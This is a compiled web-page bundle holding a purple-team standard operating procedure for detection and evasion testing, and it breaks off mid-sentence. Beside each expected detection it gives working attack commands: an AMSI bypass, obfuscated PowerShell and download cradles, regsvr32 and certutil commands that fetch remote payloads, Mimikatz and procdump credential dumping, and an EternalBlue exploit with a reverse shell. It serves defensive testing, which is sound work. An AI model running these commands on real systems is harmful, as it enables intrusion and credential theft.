"use strict";(globalThis.webpackChunkgl_0_bal_01=globalThis.webpackChunkgl_0_bal_01||[]).push([[5992],{28453:(e,n,i)=>{i.d(n,{R:()=>o,x:()=>l});var t=i(96540);const s={},r=t.createContext(s);function o(e){const n=t.useContext(r);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),t.createElement(r.Provider,{value:n},e.children)}},49155:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>a,contentTitle:()=>l,default:()=>h,frontMatter:()=>o,metadata:()=>t,toc:()=>c});const t=JSON.parse('{"id":"Security/Pentesting/sop-detection-evasion-testing","title":"Detection & Evasion Testing SOP (Purple Team)","description":"Bypass security controls: evade AV, EDR, IDS/IPS, firewalls & SIEM detection. Obfuscation, encoding, polymorphism & anti-forensics techniques.","source":"@site/intel-codex/Security/Pentesting/sop-detection-evasion-testing.md","sourceDirName":"Security/Pentesting","slug":"/Security/Pentesting/sop-detection-evasion-testing","permalink":"/intel-codex/Security/Pentesting/sop-detection-evasion-testing","draft":false,"unlisted":false,"editUrl":"https://github.com/gl0bal01/intel-codex/tree/main/intel-codex/Security/Pentesting/sop-detection-evasion-testing.md","tags":[{"inline":true,"label":"sop","permalink":"/intel-codex/tags/sop"},{"inline":true,"label":"detection","permalink":"/intel-codex/tags/detection"},{"inline":true,"label":"evasion","permalink":"/intel-codex/tags/evasion"},{"inline":true,"label":"purple-team","permalink":"/intel-codex/tags/purple-team"},{"inline":true,"label":"red-team","permalink":"/intel-codex/tags/red-team"},{"inline":true,"label":"blue-team","permalink":"/intel-codex/tags/blue-team"}],"version":"current","lastUpdatedAt":null,"frontMatter":{"type":"sop","title":"Detection & Evasion Testing SOP (Purple Team)","description":"Bypass security controls: evade AV, EDR, IDS/IPS, firewalls & SIEM detection. Obfuscation, encoding, polymorphism & anti-forensics techniques.","tags":["sop","detection","evasion","purple-team","red-team","blue-team"],"template_version":"2025-10-05T00:00:00.000Z"},"sidebar":"intelCodexSidebar","previous":{"title":"Bug Bounty Methodology SOP","permalink":"/intel-codex/Security/Pentesting/sop-bug-bounty"},"next":{"title":"Firmware Reverse Engineering","permalink":"/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering"}}');var s=i(74848),r=i(28453);const o={type:"sop",title:"Detection & Evasion Testing SOP (Purple Team)",description:"Bypass security controls: evade AV, EDR, IDS/IPS, firewalls & SIEM detection. Obfuscation, encoding, polymorphism & anti-forensics techniques.",tags:["sop","detection","evasion","purple-team","red-team","blue-team"],template_version:new Date("2025-10-05T00:00:00.000Z")},l="Detection & Evasion Testing SOP (Purple Team)",a={},c=[{value:"Table of Contents",id:"table-of-contents",level:2},{value:"1. Pre-Engagement &amp; Authorization",id:"1-pre-engagement--authorization",level:2},{value:"Authorization Requirements",id:"authorization-requirements",level:3},{value:"Lab Environment Requirements",id:"lab-environment-requirements",level:3},{value:"2. Threat Intelligence &amp; Hypothesis Development",id:"2-threat-intelligence--hypothesis-development",level:2},{value:"Threat Modeling",id:"threat-modeling",level:3},{value:"Hypothesis Formulation",id:"hypothesis-formulation",level:3},{value:"3. Test Planning &amp; Scenario Design",id:"3-test-planning--scenario-design",level:2},{value:"Control Coverage Matrix",id:"control-coverage-matrix",level:3},{value:"Success Metrics",id:"success-metrics",level:3},{value:"Test Scenarios",id:"test-scenarios",level:3},{value:"4. Adversary Simulation Tools &amp; Techniques",id:"4-adversary-simulation-tools--techniques",level:2},{value:"Red Team Testing Frameworks",id:"red-team-testing-frameworks",level:3},{value:"Specific Evasion Techniques to Test",id:"specific-evasion-techniques-to-test",level:3},{value:"5. Execution &amp; Monitoring",id:"5-execution--monitoring",level:2},{value:"Execution Protocol",id:"execution-protocol",level:3},{value:"Data Collection",id:"data-collection",level:3},{value:"6. Analysis &amp; Gap Identification",id:"6-analysis--gap-identification",level:2},{value:"Detection Coverage Analysis",id:"detection-coverage-analysis",level:3},{value:"False Positive Analysis",id:"false-positive-analysis",level:3},{value:"Evasion Success Tracking",id:"evasion-success-tracking",level:3},{value:"7. Reporting &amp; Improvement",id:"7-reporting--improvement",level:2},{value:"Executive Summary Template",id:"executive-summary-template",level:3},{value:"Improvement Tracking",id:"improvement-tracking",level:3},{value:"8. Safety &amp; Legal",id:"8-safety--legal",level:2},{value:"Safety Protocols",id:"safety-protocols",level:3},{value:"Legal Considerations",id:"legal-considerations",level:3},{value:"9. Tools Reference",id:"9-tools-reference",level:2},{value:"10. Common Pitfalls",id:"10-common-pitfalls",level:2},{value:"Related SOPs",id:"related-sops",level:2}];function d(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",input:"input",li:"li",mdxAdmonitionTitle:"mdxAdmonitionTitle",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(n.admonition,{type:"danger",children:[(0,s.jsxs)(n.mdxAdmonitionTitle,{children:["Synced from an ",(0,s.jsx)(n.strong,{children:"Obsidian vault"})]}),(0,s.jsxs)(n.p,{children:["For graph and advanced features, download the ",(0,s.jsx)(n.strong,{children:"full"})," ",(0,s.jsx)(n.strong,{children:(0,s.jsx)(n.a,{href:"https://github.com/gl0bal01/intel-codex",children:"Intel Codex Vault"})})," and open it in ",(0,s.jsx)(n.strong,{children:"Obsidian"}),"."]})]}),"\n",(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"detection--evasion-testing-sop-purple-team",children:"Detection & Evasion Testing SOP (Purple Team)"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Purpose:"})," Validate detection coverage by simulating adversary techniques in a controlled environment. Test both detection capabilities (blue team) and evasion techniques (red team) to improve security posture."]}),"\n"]}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Lab Only:"})," Never test evasion techniques in production without explicit authorization and coordination."]}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"table-of-contents",children:"Table of Contents"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"#detection--evasion-testing-sop-purple-team",children:"Detection & Evasion Testing SOP (Purple Team)"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#table-of-contents",children:"Table of Contents"})}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"#1-pre-engagement--authorization",children:"1. Pre-Engagement & Authorization"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#authorization-requirements",children:"Authorization Requirements"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#lab-environment-requirements",children:"Lab Environment Requirements"})}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"#2-threat-intelligence--hypothesis-development",children:"2. Threat Intelligence & Hypothesis Development"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#threat-modeling",children:"Threat Modeling"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#hypothesis-formulation",children:"Hypothesis Formulation"})}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"#3-test-planning--scenario-design",children:"3. Test Planning & Scenario Design"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#control-coverage-matrix",children:"Control Coverage Matrix"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#success-metrics",children:"Success Metrics"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#test-scenarios",children:"Test Scenarios"})}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"#4-adversary-simulation-tools--techniques",children:"4. Adversary Simulation Tools & Techniques"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#red-team-testing-frameworks",children:"Red Team Testing Frameworks"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#specific-evasion-techniques-to-test",children:"Specific Evasion Techniques to Test"})}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"#5-execution--monitoring",children:"5. Execution & Monitoring"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#execution-protocol",children:"Execution Protocol"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#data-collection",children:"Data Collection"})}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"#6-analysis--gap-identification",children:"6. Analysis & Gap Identification"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#detection-coverage-analysis",children:"Detection Coverage Analysis"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#false-positive-analysis",children:"False Positive Analysis"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#evasion-success-tracking",children:"Evasion Success Tracking"})}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"#7-reporting--improvement",children:"7. Reporting & Improvement"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#executive-summary-template",children:"Executive Summary Template"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#improvement-tracking",children:"Improvement Tracking"})}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"#8-safety--legal",children:"8. Safety & Legal"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#safety-protocols",children:"Safety Protocols"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#legal-considerations",children:"Legal Considerations"})}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#9-tools-reference",children:"9. Tools Reference"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#10-common-pitfalls",children:"10. Common Pitfalls"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#related-sops",children:"Related SOPs"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"1-pre-engagement--authorization",children:"1. Pre-Engagement & Authorization"}),"\n",(0,s.jsx)(n.h3,{id:"authorization-requirements",children:"Authorization Requirements"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Mandatory Approvals:"})}),"\n",(0,s.jsxs)(n.ul,{className:"contains-task-list",children:["\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Written authorization from CISO/Security Leadership"]}),"\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","IT Operations approval (lab infrastructure usage)"]}),"\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","SOC/Incident Response team briefing and consent"]}),"\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Legal review (if applicable)"]}),"\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Change control board approval (if required)"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Scope Definition:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Authorization Must Include:\n- Test environment boundaries (specific systems/networks)\n- Allowed techniques and tools\n- Testing timeframe and schedule\n- Halt criteria and escalation procedures\n- Authorized testers (names and contact info)\n- Success/failure criteria\n"})}),"\n",(0,s.jsx)(n.h3,{id:"lab-environment-requirements",children:"Lab Environment Requirements"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Isolated Test Environment:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Infrastructure requirements:\n1. Isolated network segment (no production connectivity)\n2. Dedicated test systems (VMs preferred for snapshots)\n3. Separate telemetry pipeline (non-production SIEM/EDR)\n4. Snapshot capability for rapid rollback\n5. Representative configuration (mirrors production controls)\n\n# Network isolation verification:\n- Firewall rules blocking production access\n- Air-gapped or dedicated VLAN\n- Separate Active Directory domain (if applicable)\n- Test accounts only (no production credentials)\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Pre-Test Checklist:"})}),"\n",(0,s.jsxs)(n.ul,{className:"contains-task-list",children:["\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Baseline snapshots created for all test systems"]}),"\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Monitoring/logging confirmed operational"]}),"\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Test accounts created and validated"]}),"\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","SOC notified of test window"]}),"\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Rollback procedures documented and tested"]}),"\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Communication channels established (Slack, Teams, etc.)"]}),"\n",(0,s.jsxs)(n.li,{className:"task-list-item",children:[(0,s.jsx)(n.input,{type:"checkbox",disabled:!0})," ","Halt signal defined (safe word, email, emergency contact)"]}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"2-threat-intelligence--hypothesis-development",children:"2. Threat Intelligence & Hypothesis Development"}),"\n",(0,s.jsx)(n.h3,{id:"threat-modeling",children:"Threat Modeling"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Identify Threat Actors Relevant to Organization:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"APT groups targeting your industry (financial, healthcare, energy, etc.)"}),"\n",(0,s.jsx)(n.li,{children:"Commodity malware and ransomware families"}),"\n",(0,s.jsx)(n.li,{children:"Insider threats (malicious and negligent)"}),"\n",(0,s.jsx)(n.li,{children:"Supply chain attack vectors"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"MITRE ATT&CK Framework Mapping:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Select tactics/techniques to test based on:\n1. Threat intelligence (active campaigns targeting your sector)\n2. Recent incidents or near-misses\n3. Control gaps identified in prior assessments\n4. New detection capabilities being validated\n\nExample Focus Areas:\n- Initial Access: Phishing, exploiting public-facing apps\n- Execution: PowerShell, WMI, scheduled tasks\n- Persistence: Registry run keys, services, scheduled tasks\n- Privilege Escalation: UAC bypass, token manipulation\n- Defense Evasion: Obfuscation, process injection, AMSI bypass\n- Credential Access: Credential dumping, Kerberoasting\n- Discovery: Network scanning, user enumeration\n- Lateral Movement: Pass-the-Hash, RDP, PsExec\n- Collection: Screen capture, clipboard data\n- Exfiltration: C2 channels, DNS tunneling\n"})}),"\n",(0,s.jsx)(n.h3,{id:"hypothesis-formulation",children:"Hypothesis Formulation"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Detection Hypotheses (Blue Team Perspective):"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'Example Hypotheses:\n1. "Our EDR will detect PowerShell obfuscation using Base64 encoding"\n2. "Sysmon Event ID 10 (Process Access) will capture credential dumping via LSASS"\n3. "SIEM correlation rule will alert on multiple failed login attempts followed by success"\n4. "Network monitoring will detect C2 beaconing patterns"\n5. "File integrity monitoring will alert on unauthorized changes to system binaries"\n\nHypothesis Template:\n"When [RED TEAM ACTION], we expect [BLUE TEAM CONTROL] to [DETECT/ALERT/BLOCK] within [TIME THRESHOLD] with [FIDELITY LEVEL]"\n'})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"3-test-planning--scenario-design",children:"3. Test Planning & Scenario Design"}),"\n",(0,s.jsx)(n.h3,{id:"control-coverage-matrix",children:"Control Coverage Matrix"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Map Techniques to Controls:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"| MITRE Technique | Detection Control | Expected Alert | Coverage Gap |\n|-----------------|-------------------|----------------|--------------|\n| T1059.001 (PowerShell) | EDR + Script Block Logging | High confidence alert | None |\n| T1003.001 (LSASS Dump) | Sysmon Event ID 10 + EDR | Critical alert | Memory only |\n| T1021.001 (RDP) | Windows Security Event 4624 | Medium alert | No lateral movement correlation |\n| T1071.001 (C2 Web) | Proxy logs + NetFlow | Low alert (noise) | Need tuning |\n"})}),"\n",(0,s.jsx)(n.h3,{id:"success-metrics",children:"Success Metrics"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Define Measurable Outcomes:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Detection Rate"}),": % of techniques detected by at least one control"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Time to Detect (TTD)"}),": Median time from execution to alert generation"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Time to Triage (TTT)"}),": Time from alert to analyst investigation"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"False Positive Rate"}),": Alerts generated by benign test activity"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Fidelity"}),": Quality of alert context (high/medium/low confidence)"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Coverage"}),": % of ATT&CK matrix covered by active detections"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Example Thresholds:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Success Criteria:\n- Detection Rate: \u2265 80% for critical techniques\n- TTD: \u2264 5 minutes for in-memory attacks\n- TTT: \u2264 15 minutes during business hours\n- False Positive Rate: \u2264 5% of total alerts\n- High Fidelity Alerts: \u2265 60% of detections\n"})}),"\n",(0,s.jsx)(n.h3,{id:"test-scenarios",children:"Test Scenarios"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Scenario Template:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-markdown",children:"## Scenario: Credential Dumping via Mimikatz\n\n**Objective**: Validate detection of credential theft\n\n**MITRE Techniques**:\n- T1003.001 (LSASS Memory Dump)\n- T1003.002 (Security Account Manager)\n\n**Expected Detections**:\n1. EDR behavioral detection (process injection into LSASS)\n2. Sysmon Event ID 10 (ProcessAccess to lsass.exe)\n3. SIEM correlation (suspicious process + LSASS access + privilege token use)\n\n**Execution Steps**:\n1. Launch Mimikatz from test directory\n2. Execute: `sekurlsa::logonpasswords`\n3. Document alerts generated\n4. Verify credential hashes NOT exported (benign test only)\n\n**Cleanup**:\n- Terminate Mimikatz process\n- Delete test artifacts\n- Restore snapshot if persistence was tested\n"})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"4-adversary-simulation-tools--techniques",children:"4. Adversary Simulation Tools & Techniques"}),"\n",(0,s.jsx)(n.h3,{id:"red-team-testing-frameworks",children:"Red Team Testing Frameworks"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"MITRE Caldera:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Automated adversary emulation platform\n# https://github.com/mitre/caldera\n\n# Install\ngit clone https://github.com/mitre/caldera.git\ncd caldera\npip install -r requirements.txt\npython server.py\n\n# Access: http://localhost:8888\n# Select adversary profile (e.g., APT29, APT3)\n# Deploy agent to test system\n# Execute operation and observe detections\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Atomic Red Team:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:'# Atomic tests for ATT&CK techniques\n# https://github.com/redcanaryco/atomic-red-team\n\n# Install\nInstall-Module -Name invoke-atomicredteam\n\n# Import\nImport-Module invoke-atomicredteam\n\n# List techniques\nGet-AtomicTechnique\n\n# Execute specific test\nInvoke-AtomicTest T1059.001  # PowerShell execution\n\n# Execute with parameters\nInvoke-AtomicTest T1003.001 -TestGuids "a96872b2-cbf3-46cf-8eb4-27e8c0e85660"\n\n# Cleanup after test\nInvoke-AtomicTest T1059.001 -Cleanup\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Infection Monkey:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Automated lateral movement and network propagation testing\n# https://www.guardicore.com/infectionmonkey/\n\n# Deploy in isolated network\n# Configure targets (test systems only)\n# Select attack techniques\n# Execute and monitor propagation\n# Review telemetry in dashboard\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Cobalt Strike (Commercial):"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# C2 framework for red team operations\n# Use only with proper licensing and authorization\n\n# Features:\n- Beacon implant deployment\n- Process injection techniques\n- Lateral movement via PsExec, WMI, SSH\n- Credential harvesting\n- Evasion capabilities (malleable C2, AMSI bypass)\n\n# Purple team use:\n- Test detection of C2 beacons\n- Validate network monitoring (JA3, DNS, HTTP patterns)\n- Test EDR behavioral detections\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Metasploit Framework:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Open-source penetration testing framework\nmsfconsole\n\n# Example: Test SMB exploit detection\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit\n\n# Verify detection of:\n# - Network scan (Nmap/Metasploit pre-exploitation)\n# - SMB exploit attempt\n# - Reverse shell connection\n# - Meterpreter process injection\n"})}),"\n",(0,s.jsx)(n.h3,{id:"specific-evasion-techniques-to-test",children:"Specific Evasion Techniques to Test"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"1. PowerShell Obfuscation:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:'# Base64 encoding\n$command = "Write-Host \'Test Detection\'"\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encoded = [Convert]::ToBase64String($bytes)\npowershell.exe -encodedCommand $encoded\n\n# String concatenation\n$c1 = "Write"\n$c2 = "-Host"\n$c3 = "\'Evade Detection\'"\nIEX "$c1$c2 $c3"\n\n# Invoke-Expression with download\nIEX (New-Object Net.WebClient).DownloadString(\'http://test-server/script.ps1\')\n\n# Expected Detections:\n# - Script Block Logging (Event ID 4104)\n# - Module Logging (Event ID 4103)\n# - EDR behavioral detection (suspicious script execution)\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"2. LOLBins (Living Off the Land Binaries):"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# MSBuild.exe (code execution)\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe malicious.csproj\n\n# Regsvr32.exe (COM scriptlet execution)\nregsvr32 /s /n /u /i:http://test-server/test.sct scrobj.dll\n\n# CertUtil (file download)\ncertutil -urlcache -split -f http://test-server/payload.exe payload.exe\n\n# Expected Detections:\n# - Process creation from unusual parent (Sysmon Event ID 1)\n# - Network connection from unexpected binary (Sysmon Event ID 3)\n# - Command-line logging showing suspicious parameters\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"3. Process Injection:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# DLL Injection\n# CreateRemoteThread API \u2192 inject DLL into target process\n\n# Process Hollowing\n# Create suspended process \u2192 replace memory \u2192 resume\n\n# Reflective DLL Injection\n# Load DLL directly into memory (no disk artifacts)\n\n# Expected Detections:\n# - Sysmon Event ID 8 (CreateRemoteThread)\n# - Sysmon Event ID 10 (ProcessAccess with suspicious rights)\n# - EDR behavioral detection (memory allocation patterns)\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"4. AMSI Bypass:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-powershell",children:"# AMSI (Anti-Malware Scan Interface) bypass techniques\n\n# Reflection-based bypass\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# Expected Detections:\n# - Script Block Logging (full script content)\n# - EDR monitoring of AMSI tampering\n# - Memory scanning for known bypass patterns\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"5. Credential Dumping:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Mimikatz\nmimikatz.exe "sekurlsa::logonpasswords" "exit"\n\n# Impacket secretsdump\nsecretsdump.py -sam sam.save -system system.save LOCAL\n\n# ProcDump + Mimikatz (two-stage)\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n# Transfer lsass.dmp offline, analyze with Mimikatz\n\n# Expected Detections:\n# - Sysmon Event ID 10 (ProcessAccess to lsass.exe)\n# - EDR behavioral (credential access pattern)\n# - Security Event 4656 (handle to LSASS)\n'})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"5-execution--monitoring",children:"5. Execution & Monitoring"}),"\n",(0,s.jsx)(n.h3,{id:"execution-protocol",children:"Execution Protocol"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Pre-Execution:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# 1. Verify test environment isolation\nping production-server.example.com  # Should fail\n\n# 2. Confirm monitoring is active\n# Check SIEM/EDR console for heartbeat from test systems\n\n# 3. Notify SOC via designated channel\n"Purple Team Test START - Scenario: [NAME] - Expected Duration: [TIME]"\n\n# 4. Start packet capture (if network testing)\ntcpdump -i eth0 -w test_capture.pcap\n\n# 5. Document baseline state\nGet-Process > pre_test_processes.txt  # Windows\nps aux > pre_test_processes.txt       # Linux\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"During Execution:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Execute technique with detailed logging\n# Example: PowerShell with transcript\nStart-Transcript -Path C:\\Logs\\purple_team_test.log\n# [Execute test technique]\nStop-Transcript\n\n# Monitor for alerts in real-time\n# - SIEM dashboard\n# - EDR console\n# - Email/Slack notifications\n\n# Document observations:\n- Time of execution (UTC)\n- Command/tool used\n- Alerts generated (alert ID, rule name, timestamp)\n- False positives triggered\n- Detection gaps (no alert when expected)\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Post-Execution:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# 1. Execute cleanup procedures\nRemove-Item C:\\Temp\\test_payload.exe\nRemove-Item HKCU:\\Software\\Test\\PersistenceKey\n\n# 2. Verify cleanup\nGet-ChildItem C:\\Temp\\test_*  # Should be empty\n\n# 3. Collect telemetry\n# Export SIEM alerts for test window\n# Export EDR events for test endpoints\n# Save packet capture\n\n# 4. Notify SOC of test completion\n"Purple Team Test END - Scenario: [NAME] - Review alerts and provide feedback"\n\n# 5. Restore snapshot if destructive testing occurred\n# VMware: Revert to snapshot "pre_purple_test"\n# Hyper-V: Apply 